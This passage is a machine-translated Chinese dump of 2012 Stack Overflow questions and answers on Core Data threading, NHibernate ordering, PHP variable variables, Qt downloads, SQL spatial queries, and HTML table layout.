无论如何，我确信我的第一个赌注是正确的，并且您正在`mainContext`从不同的线程使用 MOC。您的 SLSyncOperation 在它自己的线程中运行，并且正在使用它自己的 MOC（它创建的那个）。但是，在该操作中，它似乎是在调用`saveSnapshot`which 调用`clear`，而后者又在使用`mainContext`，而不是创建用于该`NSOperation`.

是 AppDelegate 拥有的`mainContext`MOC，用于主线程中的东西。它也在这个“其他”线程中被调用和使用。查看您的堆栈跟踪以获取证据。这是核心数据和线程的第一条规则。您不能允许多个线程同时访问同一个 MOC。

因此，您正在旋转一个单独的线程来完成一些工作，并创建一个本地 MOC 来完成这些工作。一切都很好。但是，您仍然从该线程调用一个明确想要使用的方法`mainContext`（在这种情况下`saveSnapshot`，是直接从您的操作的`main`.

现在，您有几个选择：

将本地生成的 MOC 传递给这些方法，以便它们在正确的 MOC 上运行。也许您打算改为对 MOC 进行快照？

如果你真的打算让这些方法在`mainContext`MOC 上运行，那么你需要确保它们在主线程中执行。我不喜欢`perform`选择器，更喜欢直接 GCD。

```
dispatch_async(dispatch_get_main_queue(), ^{
    // Now you can call the saveSnapshot and other stuff that must use
    // mainContext since stuff in this block will execute on the main thread.
}); 
```

如果您使用的是主 MOC，并且有任何其他线程，我强烈建议您**不要**对主 MOC 使用限制并发。相反，我建议使用这种替代方法：

```
managedObjectContext = [[NSManagedObjectContext alloc]
                        initWithConcurrencyType:NSMainQueueCurrencyType]; 
```

现在，该 MOC 可以像其他 MOC 一样使用，无需更改代码（换句话说，当在主线程上使用时，它仍将像限制 MOC 一样正常运行）。但是，它也可以更合适地用于其他线程：

```
[managedObjectContext performBlock:^{
    // Do anything with this MOC because its protected, and
    // running on the right thread.
}]; 
```

如有必要，您可以调用`performBlockAndWait`which 是可重入的（dispatch_sync**不是**可重入的 - 它会导致死锁）。您仍然必须小心任何`sync`操作以避免 a`deadly embrace`但`performBlockAndWait`可以从同一线程递归调用而不会死锁。

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-09-05T18:11:34.437

看起来您正在两个线程之间共享一个 NSManagedObjectContext 。这只是一个猜测，但考虑到线程 5 上正在发生崩溃，这似乎很可能是问题所在。您只能在一个线程上使用 NSManagedObjectContext。我猜你是`mainContext`在主线程上创建的，然后出于某种原因`clear`在后台线程上调用你的方法。

以下是一些可能的解决方案：

1.  创建一个新的 NSManagedObjectContext 以在后台线程中使用。
2.  您可以确保`clear`在主线程上调用您的方法。这是确保发生这种情况的一种方法：

    ```
    -(void)clear:(id)object {
        if(![[NSThread currentThread] isMainThread]) {
            [self performSelectorOnMainThread:@selector(clear:) withObject:object waitUntilDone:NO];
            return;
        }
        ...
    } 
    ```

3.  理论上你可以`lock`然后`unlock`你的 NSManagedObjectContext。这是我最不推荐的解决方案。

Reading [this thread](https://stackoverflow.com/questions/1454473/multithreaded-use-of-core-data-nsoperationqueue-and-nsmanagedobjectcontext) might also help you.

# c# - 按 nHibernate 排序导致“Antlr.Runtime.NoViableAltException”

> ID：12213098
> 
> 赞同：0
> 
> 时间：2012-08-31T10:00:52.477
> 
> 标签：c#, linq, fluent-nhibernate, linq-to-nhibernate

我收到以下错误

> 引发了“Antlr.Runtime.NoViableAltException”类型的异常。[.OrderBy[ORM.Entities.Core.Message,System.DateTime](.Where[ORM.Entities.Core.Message](NHibernate.Linq.NhQueryable`1[ORM.Entities.Core.Message], Quote((x , ) => (AndAlso(AndAlso(String.op_Equality(x.ConcerningItemType, p1), Equal(x.ConcerningItemId, p2)), OrElse(Equal(x.Sender.Id, p3), .Any[ORM.Entities. Core.MessageRecipient](x.Recipients, (r, ) => (Equal(r.Employee.Id, p4)), ))))), ), Quote((x, ) => (.FirstORM.Entities. Core.AuditGroup.Created)), )]

当我有一个 IQueryable 结果集（刚刚对其应用了一些逻辑）然后我尝试在调用 ToList() 之前按子属性变量对其进行排序

```
var results = query.Where(x => x.ConcerningItemType == "1422" && x.ConcerningItemId == EnquiryId && //Messages for this Enquiry
                            (x.Sender.Id == EmployeeId || x.Recipients.Any(r => r.Employee.Id == EmployeeId))); 
```

然后我尝试订购导致错误

```
var results2 = results.OrderBy(x => x.AuditGroup.First().Created).ToList(); 
```

如果我执行以下操作，则不会出现错误（移动 tolist 以强制它访问数据库）

```
var results3 = results.ToList().OrderBy(x => x.AuditGroup.First().Created); 
```

* * *

询问要求的更多信息

审计组类

```
 public class AuditGroup : Entity
{
    public virtual string Guid { get; set; }
    public virtual string PageName { get; set; }
    public virtual string ControlId { get; set; }
    public virtual string ItemType { get; set; }
    public virtual int ItemId { get; set; }
    public virtual int EmployeeId { get; set; }
    public virtual string IPAddress { get; set; }
    public virtual string Parameters { get; set; }
    public virtual DateTime Created { get; set; }

} 
```

消息类

```
 public class Message : Entity
{
    // This class represents the standard address fields, for reuse in other entities
    // 
    public virtual int Id { get; set; }
    public virtual int ConcerningItemId { get; set; }
    public virtual String ConcerningItemType { get; set; }
    public virtual String Subject { get; set; }
    public virtual String Body { get; set; }
    public virtual int RecipientCount { get; set; }
    public virtual String RowStatus { get; set; }

    public virtual Employee Sender { get; set; }
    public virtual ICollection<MessageRecipient> Recipients { get; set; }

    //eww have to do this to be able to access the created date of the message (stored in AuditGroup... Stupidly!)
    public virtual ICollection<AuditGroup> AuditGroup { get; set; }
} 
```

消息映射

```
 public MessageMapping()
    {
        Id(x => x.Id).Column("MessageId");
        Map(x => x.ConcerningItemId).Nullable().Column("ItemId");
        Map(x => x.ConcerningItemType).Nullable().Column("ItemType");

        Map(x => x.Subject).Nullable();
        Map(x => x.Body);
        Map(x => x.RecipientCount).Column("MessageRecipientCount");
        Map(x => x.RowStatus).Column("MessageRowStatus");

        References(x => x.Sender).Column("EmployeeId");
        HasMany(x => x.Recipients).KeyColumn("MessageId");

        //AuditGroup has ItemId-ItemType Needs to map to MessageId-ItemType
        HasMany(x => x.AuditGroup).KeyColumn("ItemId").Where("ItemType = '1419'");
    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T11:34:37.077

请提供更多信息（实体和地图）

我很确定`x.AuditGroup.First().Created`是罪魁祸首。我这样说是因为我试图认为 SQL 查询生成了，但我不能。

我建议为此创建一个别名`AuditGroup`并对其进行排序。这是非常粗略的我会怎么做。

```
AuditGroup auditGroupAlias = null;

query.JoinAlias(p => p.AuditGroup, () => auditGroupAlias)
     .OrderBy(()=>auditGroupAlias.Created) 
```

再次使用部分信息，我只能给出部分解决方案。

# php - 构建php变量的名称

> ID：12213105
> 
> 赞同：1
> 
> 时间：2012-08-31T10:01:28.423
> 
> 标签：php

```
$service3_step1_person = ‘999’;    
echo $service3_step1_person;    //999 
```

进而...

```
$service = "service3";    
echo "$".$service."_step1_person;  //$service3_step1_person 
```

它没有给我**999**，只是给我一串`$service3_step1_person`.

如何使字符串成为新的变量名？谢谢！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-31T10:06:35.483

```
echo ${$service."_step1_person"}; 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-31T10:05:14.010

变量变量：

```
$service3_step1_person = ‘999’;
$service = "service3";
$variableName = "{$service}_step1_person";  
echo $$variableName; // 999 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-31T10:06:11.823

试试这个：

```
 $service = "service3";
 $temp = "_step1_person";
 echo ${$service.$temp}; 
```

# php - 关于 PHP 登录代码和学习 php 的一些事情？

> ID：12213106
> 
> 赞同：0
> 
> 时间：2012-08-31T10:01:37.437
> 
> 标签：php

[http://www.9lessons.info/2009/09/php-login-page-example.html](http://www.9lessons.info/2009/09/php-login-page-example.html)

在 login.php 部分，为什么要添加`$active=$row['active'];`. 当我运行代码时，它显示`Notice: Undefined index: REQUEST_METHOD`。如何纠正它？谢谢你。

我是php的新手，但我不知道如何学好它。有时 。我遵循网络和其他教程，并从他们那里输入代码，尽管我不太了解代码。一段时间后。我感觉我的php编码能力没有一步步的进步，我该怎么办？非常感谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T10:16:59.943

为什么它添加 $active=$row['active'] - 看起来这必须是一个字段，如果用户处于活动状态或未指定。但是该代码有一个错误。Select 不占用任何活动列。

`Undefined index: REQUEST_METHOD`- 如果您尝试访问数组中不存在的键，则会发生这种情况。你可以用下一个方法测试它 `if(isset($_SERVER["REQUEST_METHOD"]) && $_SERVER["REQUEST_METHOD"] == "POST") {...}`

where`isset`将检查此类密钥是否存在。但奇怪的是为什么你没有它。浏览器必须始终发送它。无论如何都会有 GET 或 POST 之类的东西。

如何学习？我只是拿了一些简单的书，读了它，然后做了我自己的小网站。但那时我已经有了其他语言的经验。有一点很清楚——您给我们提供链接的那个网站并不是学习 PHP 的最佳方式。示例有一个愚蠢的错误，而且在那个示例中，我看到他们正在使用 addlashes 来避免 SQL 注入，这确实是不够的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-31T10:06:36.380

这很可能意味着您的服务器不完全支持 PHP，因此`$_SERVER['REQUEST_METHOD']`未启用...如果您在本地开发，也许尝试[XAMPP](http://www.apachefriends.org/en/xampp.html)来测试有问题的代码

但在将其部署到真实服务器时要小心 - 确保那里支持 REQUEST_METHOD

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-31T10:24:46.603

**为什么要添加 $active=$row['active'];** =>因为该表包含字段名称**active**，其中的值正在检索。但是在代码中使用它没有任何意义。

**当我运行代码时，它显示 Notice: Undefined index: REQUEST_METHOD** =>因为 login.php 中包含的代码有一个错误的开始**>?php**应该是这样的。

因此，您的问题将得到解决。

# google-chrome - Internet Explorer 中的 HtmlPage.window.navigate

> ID：12213116
> 
> 赞同：1
> 
> 时间：2012-08-31T10:02:06.487
> 
> 标签：google-chrome, internet-explorer-9, silverlight-5.0

我开发了一个小型 Silverlight 应用程序，使用 Chrome 进行测试时一切正常。我的应用程序的一部分涉及从托管应用程序的服务器下载 ISO 映像。为方便起见，我使用以下代码：

```
Uri uri = new Uri("http://mytetSite/somefile.iso");
HtmlPage.Window.Navigate(uri); 
```

使用 Chrome 测试应用程序时，会使用原生 Chrome 下载器 thingy 下载文件。使用 Internet Explorer 9 时，执行上述代码时没有任何反应，我也尝试使用 Hyperlinkbutton 控件（和设置 navigateuri） - 但结果相同：在 chrome 中工作，但在 Internet Explorer 中按下按钮时*没有任何反应。*

什么可能导致上述情况 - 我将如何解决它？（我什至没有在 Internet Explorer 中弹出警告对话框）。

# javascript - cssClassApplier 仅适用于指定 div 中的选定文本

> ID：12213120
> 
> 赞同：2
> 
> 时间：2012-08-31T10:02:20.690
> 
> 标签：javascript, textselection, rangy

我正在尝试将类添加到文档中的选定文本。问题是我不希望用户能够选择页面上的所有文本（例如使用 command+A ...）所以我想从一个范围中删除节点，但我不知道如何要做到这一点。这个页面有很多文本/嵌套的 div，所以使用添加的类来检查它是否在一个可选择的元素中会非常耗时/慢。

我做了一个小提琴来解释我想要做得更好的事情。 [http://jsfiddle.net/thomasjonas/BhKFt/20/](http://jsfiddle.net/thomasjonas/BhKFt/20/)

如果您选择此示例中的所有文本，则该类将添加到所有 div。我希望它只将 css 应用于具有“是”类的 div。有没有一个不错的、非浏览器崩溃的解决方案？

提前致谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-08T11:04:51.160

以下内容有点笨拙且效率低下，因为它检查每个带有“yes”类的元素与选择相交。例如，您可以通过提前检查选择是否完全位于具有“yes”类的单个元素中来改进它。它使用 Rangy 专有`intersection()`的范围对象方法。

演示：http: [//jsfiddle.net/timdown/BhKFt/23/](http://jsfiddle.net/timdown/BhKFt/23/)

代码：

```
// getElementsByClassName implementation for browsers without it
// (IE <= 7, for example)
var getElementsByClassName =
    (typeof document.documentElement.getElementsByClassName != "undefined") ?

    function(el, cssClass) {
        return el.getElementsByClassName(cssClass);
    } :
    function(el, cssClass) {
        var allEls = el.getElementsByTagName("*");
        var elsWithClass = [];
        var classRegex = new RegExp("(?:^|\\s)" + cssClass + "(?:\\s|$)");
        for (var i = 0, len = allEls.length, el; i < len; ++i) {
            el = allEls[i];
            if (el.className && classRegex.test(el.className)) {
                elsWithClass.push(el);
            }
        }
        return elsWithClass;
    };

$(document).ready(function(){
    rangy.init();
    $(document).mouseup(function(){
        var sel = rangy.getSelection();
        var range = sel.getRangeAt(0);
        var classApplier = rangy.createCssClassApplier("tmp");

        var els = getElementsByClassName(document.body, "yes");

        // Create an array of ranges that represent the intersection of
        // the selection with each "yes" element
        var rangesWithClass = [];
        for (var i = 0, len = els.length, elRange; i < len; ++i) {
            if (range.intersectsNode(els[i])) {
                elRange = rangy.createRange();
                elRange.selectNode(els[i]);
                rangesWithClass.push(range.intersection(elRange));
                elRange.detach();
            }
        }

        // Apply the class to the ranges obtained in the last step
        for (i = 0, len = rangesWithClass.length; i < len; ++i) {
            classApplier.applyToRange(rangesWithClass[i]);
            rangesWithClass[i].detach();
        }

        sel.removeAllRanges();
    });
}); 
```

如果传入的选项对象有某种过滤选项，这可能会很有用`rangy.createCssClassApplier()`。我会考虑的。

# java - Java 泛型运行时实例化

> ID：12213126
> 
> 赞同：0
> 
> 时间：2012-08-31T10:02:34.940
> 
> 标签：java, generics, reflection

我有我的通用接口：

```
public interface myGenericInterface<T> {...} 
```

我有一个这样检索的类：

```
Class<?> myClass = Class.forName("myClassName"); 
```

我希望能够实例化这样的东西：

```
myGenericInterface<myClass> mySubType ... 
```

它当然行不通。有没有办法做这样的事情？

更新：

好吧，由于泛型与编译时相关，我猜它不适用于反射样式代码。所以不会有什么好处。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T10:34:35.920

泛型是一个**编译时**特性，有助于避免编程错误，所以你试图做的事情没有意义，对不起。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-31T11:49:26.253

当您在类字段中使用泛型声明对象时，此类中的字段反射对象会保留声明的泛型类型。

```
static class ClassA {
    public List<String> field = new ArrayList<String>();
}

public static void main(String[] args) throws Exception {
    Field field = ClassA.class.getField("field");
    Class<?> genericType = getGenericType(field);
    System.out.println(genericType);
}

private static Class<?> getGenericType(Field field) {
    final Type type0 = field.getGenericType();
    if (type0 instanceof ParameterizedType) {
        final Type type = ((ParameterizedType) type0).getActualTypeArguments()[0];
        if (type instanceof Class<?>) {
            return (Class<?>) type;
        }
        // miss code for method arguments
    }
    return Object.class;
} 
```

代码打印`class java.lang.String`并且在您的情况下可能很有用，但基本上原始 Class 对象不携带泛型信息 - 因为泛型信息仅用于编译时而不是运行时。

# c# - 如何访问不同对象中的相同属性？

> ID：12213135
> 
> 赞同：0
> 
> 时间：2012-08-31T10:03:04.580
> 
> 标签：c#, .net, wpf, oop, mvvm

想象一下我有这门课：

```
Class Foo
{
    public Bar b1 { get; set; }
    public Bar b2 { get; set; }
    public Bar b3 { get; set; }

    public void UpdateBarsMyProp(bool value)
    {
        // ????
    }
}

Class Bar
{
    public bool MyProp { get; set; }

    public bool UpdateMyProp(bool value)
    {
        this.MyProp = value;
    }
} 
```

更新 b1、b2 和 b3 中的属性 MyProp 的最佳方法是什么？

泛型？

代表？

**编辑：**

只是为了添加有关我的具体情况的更多信息：

我正在创建一个虚拟键盘，我正在使用 WPF MVVM，所以我有：

一个包含多个 Key ViewModel 的 KeyBoard ViewModel，我无法将它们存储在 List 中，因为我的 View（xaml 文件）需要将每个关键信息绑定到特定的 ViewModel。

现在，当用户按下虚拟 shift 按钮时，我需要我的 Keyboard ViewModel 对象来更新每个 Key ViewModel 中的显示字符。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-31T10:13:07.270

你可以把你的属性放在一个`List<Bar>`（或者如果你喜欢的话是一个数组......）并对其进行迭代。

所以：

```
public Bar b1 { get; set; }
public Bar b2 { get; set; }
public Bar b3 { get; set; }
// other Bar props...

private List<Bar> barsList = new List<Bar>(){ b1, b2, b3, ... };

public void UpdateBarsMyProp(bool value)
{
    foreach(Bar bar in barsList)
    {
        bar.MyProp = value;
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-31T10:08:12.213

也许您的示例已简化，但为什么不这样做

```
b1.MyProp = b2.MyProp = b3.MyProp = value; 
```

另外，为什么要打扰这种`UpdateMyProp`方法？这与您拥有的属性设置器方法相同。如果您需要向 setter 添加更多逻辑，可以通过更改来停止使用自动实现的属性

```
public bool MyProp { get; set; } 
```

到

```
private bool myProp;

public bool MyProp
{
   get { return this.myProp; }
   set
   {
      // any logic here
      this.myProp = value;
   }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-31T10:11:14.420

如果您的所有条形对象都需要相同的 MyProp，您可以将 MyProp 设置为静态：

```
public static bool MyProp { get; set; } 
```

然后，您可以使用以下命令编辑所有 bar 对象的所有 MyProps：

```
Bar.MyProp = baz; 
```

仅当所有 Bar 对象共享相同的 MyProp 时才使用此选项

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-31T10:19:24.863

你可能想要这样的东西。

```
class Foo
{
    private readonly IList<Bar> bars = new List<Bar>
        {
            new Bar(),
            new Bar(),
            new Bar()
        }

    public Bar this[int i]
    {
        get
        {
           return this.bars[i];
        }
    }

    public void UpdateBars(bool value)
    {
        foreach (var bar in this.bars)
        {
            bar.MyProp = value;
        }
    }
} 
```

然后您可以像这样访问第一个栏

```
var foo = new Foo();
var firstBar = foo[0]; 
```

您可以[使用一个小转换器绑定到索引器](https://stackoverflow.com/questions/4511619/wpf-bind-to-indexer)，这将使您的模型不那么脆弱。

* * *

如果您不想使用索引器，则可以将 setter 提高到`Foo`.

```
Class Foo
{
    public Bar b1 { get; set; }
    public Bar b2 { get; set; }
    public Bar b3 { get; set; }

    public bool MyProp
    {
        set
        {
            if (this.b1 != null)
            {
                this.b1.MyProp = value;
            }

            if (this.b2 != null)
            {
                this.b2.MyProp = value;
            }

            if (this.b3 != null)
            {
                this.b3.MyProp = value;
            }
        }
    }
} 
```

# qt - 如何使用 Qt 从 SourceForge 下载文件

> ID：12213138
> 
> 赞同：1
> 
> 时间：2012-08-31T10:03:13.763
> 
> 标签：qt, http, sourceforge

我正在使用需要从 SourceForge 下载文件的 Qt 框架编写 C++ 应用程序。

我必须下载这个文件[https://sourceforge.net/projects/meshlab/files/updates/1.3.3/updates.xml](https://sourceforge.net/projects/meshlab/files/updates/1.3.3/updates.xml)

我使用 Qt 和 QHttp 类编写了以下代码：

```
QFile tmpfile;
int hostreqid;
int checkreqid;
...
...
tmpfile.setFileName("updates.xml");
hostreqid = http.setHost("sourceforge.net",QHttp::ConnectionModeHttp);
checkreqid = http.get(QString(QUrl::toPercentEncoding("/projects/meshlab/files/updates/1.3.3/updates.xml")),&tmpfile);
...
...
void parseAnswer( int id,bool error )
{
    if (!error && (id == checkreqid))
    {
            ...
        tmpfile.close();
    }
    if (error)
    {
        QHttp::Error err = http.error();
        QString errstrg = http.errorString();
    }
} 
```

QHttp::setHost 和 QHttp::get 都不是立即返回 int id 的阻塞函数。当 http 文件传输完成时，会自动调用 parseAnswer 函数。问题是，在我得到的updates.xml 文件中，我收到了来自SouceForge 的报告“Invalid Project”错误的html 文件，而不是我期待的数据。

我注意到当我从浏览器访问[https://sourceforge.net/projects/meshlab/files/updates/1.3.3/updates.xml](https://sourceforge.net/projects/meshlab/files/updates/1.3.3/updates.xml)时，我已被重定向到[https://sourceforge.net/projects/meshlab/files /updates/1.3.3/updates.xml/下载](https://sourceforge.net/projects/meshlab/files/updates/1.3.3/updates.xml/download)页面。我也尝试了这个其他地址，但没有任何改变。

请注意，我使用的是 Http 协议 (QHttp::ConnectionModeHttp) 而不是 https。如果可以的话，我希望避免使用 https。可能是问题的根源吗？

非常感谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-03T09:13:19.050

我在另一个论坛上得到了答案（感谢 AcerExtensa……我不知道他的真名）。看起来问题是我错过了处理 sourceforge 重定向。我在这里发布了他的回复：

```
#ifndef SFORGE_H
#define SFORGE_H

#include <QNetworkAccessManager>
#include <QNetworkReply>

class SForge : public QNetworkAccessManager
{
    Q_OBJECT
public:
    explicit SForge(QObject *parent = 0);

private slots:
    void fin(QNetworkReply *);

};

#endif // SFORGE_H
code:
#include "sforge.h"
#include <QDateTime>
#include <QUrl>
#include <QNetworkRequest>
#include <QDebug>

SForge::SForge(QObject *parent):QNetworkAccessManager(parent)
{
    QUrl url("http://downloads.sourceforge.net/project/meshlab/updates/1.3.3/updates.xml?r=&ts="+QString::number(QDateTime::currentDateTime().toTime_t())+"&use_mirror=heanet");

    connect(this, SIGNAL(finished(QNetworkReply*)), this, SLOT(fin(QNetworkReply*)));

    QNetworkRequest req(url);
    this->get(req);
}

void SForge::fin(QNetworkReply * reply)
{
    if(reply->error() != QNetworkReply::NoError)
        qDebug() << reply->errorString();

    if(reply->attribute(QNetworkRequest::HttpStatusCodeAttribute).toInt() == 307 || reply->rawHeaderList().contains("Location"))
    {
        QNetworkRequest req(reply->header(QNetworkRequest::LocationHeader).toString());
        this->get(req);
        return;
    }

    qDebug() << __LINE__ << reply->bytesAvailable() << reply->readAll();
} 
```

非常感谢那些试图帮助我的人！

# c# - 如何将 SQL 空间结果传输到 C# 应用程序？

> ID：12213144
> 
> 赞同：1
> 
> 时间：2012-08-31T10:03:34.710
> 
> 标签：c#, sql-server-2008, stored-procedures, ado.net

我有一个表（测试），其中包含一些事件、事件日期和该事件的人数。

```
 Dat      |   Event      |  Qty
2012-30-08    SomeEvent1       5
2012-09-06    SomeEvent2      10
2012-09-18    SomeEvent3       7
2012-09-29    SomeEvent4       1
2012-10-03    SomeEvent5       2 
```

我已经建立了该表内容的图形表示。在 X 轴上，我显示了我的时间线 - 从第一个日期到最后一个日期。X 轴上的圆圈表示当前事件的人数（圆的半径 = 人数）。这是我的查询和空间结果：

```
DECLARE @FIRST_DATE DATE
DECLARE @LAST_DATE DATE
SET @FIRST_DATE = (SELECT MAX([Date]) FROM [DATABSE_TEST].dbo.TEST)
SET @LAST_DATE = (SELECT MIN([Date]) FROM [DATABSE_TEST].dbo.TEST)

--TIMELINE Build my timeline
DECLARE @SQL_TIMELINE VARCHAR(MAX)
SET @SQL_TIMELINE = 'SELECT geometry::STPolyFromText(''POLYGON((0 -0.1, 0 0.1,' + CAST(DATEDIFF(DD, @LAST_DATE,     @FIRST_DATE) AS VARCHAR) + ' 0.1, ' + CAST(DATEDIFF(DD, @LAST_DATE, @FIRST_DATE) AS VARCHAR) + ' -0.1, 0 -0.1))'', 0) AS DRAWING' 

--CIRCLES
DECLARE @SQL_CIRCLES VARCHAR(MAX) = ''

--POINTS Array of points
DECLARE @POINTS VARCHAR(MAX)

--DATE Date of current event
DECLARE @DATE DATE

--RADIUS = qty of peoples
DECLARE @RADIUS FLOAT

--X,Y coordinates of current circle
DECLARE @X_COORD FLOAT
DECLARE @Y_COORD FLOAT
DECLARE @DEGREE INT = 0

DECLARE CUR CURSOR LOCAL FOR SELECT [Date], Qty FROM [DATABSE_TEST].dbo.TEST
OPEN CUR
    FETCH NEXT FROM CUR INTO @DATE, @RADIUS
    WHILE @@FETCH_STATUS = 0 
        BEGIN
        SET @POINTS = ''
        SET @DEGREE = 0
        WHILE (@DEGREE <= 360)
            BEGIN
            --Find circle coordinates
            SET @X_COORD = DATEDIFF(DD, @LAST_DATE, @DATE) + @RADIUS * COS(@DEGREE*PI()/180)
            SET @Y_COORD = 0 + @RADIUS * SIN(@DEGREE*PI()/180)
            --Build poinrs array            
            SET @POINTS = @POINTS + CAST(@X_COORD AS VARCHAR) + ' ' + CAST(@Y_COORD AS VARCHAR) + ', '
            SET @DEGREE = @DEGREE + 10      
        END 
        --Build query: points coordinates + last point SUBSTRING(@POINTS, 0, CHARINDEX(',', @POINTS)) - tha same as first point in @POINTS to close POLYGON
        SET @SQL_CIRCLES = @SQL_CIRCLES + ' UNION ALL SELECT geometry::STPolyFromText(''POLYGON((' + @POINTS + SUBSTRING(@POINTS, 0, CHARINDEX(',', @POINTS)) + '))'',0) AS DRAWING'        
        FETCH NEXT FROM CUR INTO @DATE, @RADIUS 
        END  
CLOSE CUR 
DEALLOCATE CUR 
--Execute query
EXEC(@SQL_TIMELINE + @SQL_CIRCLES) 
```

![在此处输入图像描述](../Images/e0c24ff8187437eb7f7e5f9272c5386e.png)

![在此处输入图像描述](../Images/ade500ba66eb46f245afef701a67df15.png)

如何将空间结果传递给 C# 应用程序？我想在我的应用程序中显示此图像，但不确定如何正确传输它。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-31T10:12:56.613

如果您使用的是 .Net 框架 4.5，那么它有一个类型[DbGeometry](http://msdn.microsoft.com/en-us/library/system.data.spatial.dbgeometry.aspx)和[DbGeography](http://msdn.microsoft.com/en-us/library/system.data.spatial.dbgeography.aspx)可用于保存空间数据。这些类在[System.Data.Spatial 命名空间](http://msdn.microsoft.com/en-us/library/system.data.spatial.aspx)下可用。

但是，如果您使用的是早期版本的 .Net 框架，那么您可以从 SQL 服务器获取几何图形，该几何图形[`AS_Text`](http://msdn.microsoft.com/en-us/library/bb933977.aspx)将返回对象的 WKT，可以在您的代码中使用。

# javascript - chrome中有没有解决意外全局变量的方法

> ID：12213150
> 
> 赞同：1
> 
> 时间：2012-08-31T10:03:48.433
> 
> 标签：javascript, google-chrome

我刚刚发现在 chrome 中创建的脚本标签 id 都存储在 window 对象上。

```
<script id="deploy" type="text/html">blah</script> 
```

`window.deploy`= ➜

```
<script id="deploy" type="text/html">blah</script> 
```

`Object.keys(window)`不包括“部署”

[显然不是一个新问题](http://code.google.com/p/chromium/issues/detail?id=24955)

所以我的问题

有没有人找到解决方案（防止铬污染我的世界）我想出的唯一方法是：-

```
$('script[type="text/html"]').each ->
# stuff
delete window[@.getAttribute 'id'] 
```

我的“解决方案”在不在 chrome 中时有删除全局变量的风险。

但是，如果没有我的解决方案，如果脚本 id 冲突，chrome 可以覆盖全局变量。

真是一团糟！

任何帮助表示赞赏！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-31T10:14:31.830

> 如果您在 HTML 文档中使用该`id`属性命名一个元素，**并且 Window 对象还没有该名称的属性**，则 Window 对象被赋予一个不可枚举的属性，其名称是该`id`属性的值，其值是 HTMLElement表示该文档元素的对象。

*（由我强调）*

来源：[JavaScript：权威指南，第 6 版](http://shop.oreilly.com/product/9780596805531.do)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-31T10:13:52.573

我想出了什么：

```
<!DOCTYPE HTML>
<html lang="en-US">
<head>
    <meta charset="UTF-8">
    <title></title>
    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.0/jquery.min.js"></script>
    <script id="deploy" type="text/html">blah</script>
    <script type="text/javascript">
        $(function () {
            $('script[type="text/html"]').each(function (index, element) {
                var id = $(element).attr('id');

                console.log(element);
                console.log(window[id]);

                if (window[id] === element) {
                    window[id] = undefined;
                }

                console.log(window[id]);
            });
        });
    </script>
</head>
<body>

</body>
</html> 
```

这会在删除之前检查全局是否与节点相同。

请注意，每个 ID 都会发生这种情况，而不仅仅是`script`标签。正如 Yoshi 所说，它不应该污染您的全球范围，但上述解决方案应该适合您。

# sql-server - 在 sql server 中应该选择什么数据类型来存储 C# 枚举？

> ID：12213157
> 
> 赞同：2
> 
> 时间：2012-08-31T10:03:58.013
> 
> 标签：sql-server, enums, sqldatatypes

一般来说，我为此选择 int 或 tinyint，但如果我选择 varchar，直接从数据库表中查看数据或查询数据时会更清楚。但是使用 varchar 会是一个好习惯吗？或者有什么好的做法？

谢谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-31T10:07:51.370

出于索引的原因，使用小的数字列比使用 varchar 更好，varchar 的大小只能由枚举中有多少值来确定。如果您需要从数据库返回文本值，请将文本值存储在单独的查找表中，并在需要时加入。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-31T10:10:47.827

实际上，这取决于您想要的枚举类型，基本上是为了引用我们使用的值`int`。

# css - 设置空表单元格高度 100%

> ID：12213159
> 
> 赞同：13
> 
> 时间：2012-08-31T10:04:00.657
> 
> 标签：css, cross-browser

我有一个包含 3 `td`s 的表格行。中间`td`有文字，所以有一定的高度，比如100px。

左侧和右侧的两个`td`s 包含一个表格，每个表格显示一个（稍后）可点击区域，该区域应该与中间具有相同的高度`td`- 在我的示例中为 100px。

不幸的是，只有 Firefox 将左右`td`s 拉伸到 100% 高度。Chrome、Safari 和 IE 只是把它放在最小高度。

这是小提琴：http: [//jsfiddle.net/X3YAu/](http://jsfiddle.net/X3YAu/)

我玩过该`display`物业，但没有帮助。100% 高度不是指父元素吗？如果是，为什么`td`s 不延伸到父元素的 100% 高度？

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-08-31T10:05:49.867

把它`&nbsp;`放在你的空`<td></td>`应该会有所帮助。

* * *

**添加信息：**

我完全重写了您的代码，因为那里有很多无用的标签，这应该可以：

```
<table align="center" width="100%" cellpadding="0" cellspacing="0">
    <tr>
        <td align="center" width="100%" height="20" colspan="3" bgcolor="#A9DBF5">
            <img src="http://cdn2.iconfinder.com/data/icons/splashyIcons/arrow_large_up.png" width="16" height="16" title="Up" alt="Arrow up" style="display:inline-block;" />
        </td>
    </tr>
    <tr>
        <td align="center" width="22" height="100">
            <img src="http://cdn2.iconfinder.com/data/icons/splashyIcons/arrow_large_left.png" width="16" height="16" title="Left" alt="Arrow left" style="display:inline-block;padding:3px;background:#A9DBF5;" />
        </td>
        <td align="left" height="100" bgcolor="#FFFFFF">
            Lorem ipsum dolor sit amet, consetetur sadipscing elitr, sed diam nonumy eirmod tempor invidunt ut labore et dolore magna aliquyam erat, sed diam voluptua.
        </td>
        <td align="center" width="22" height="100">
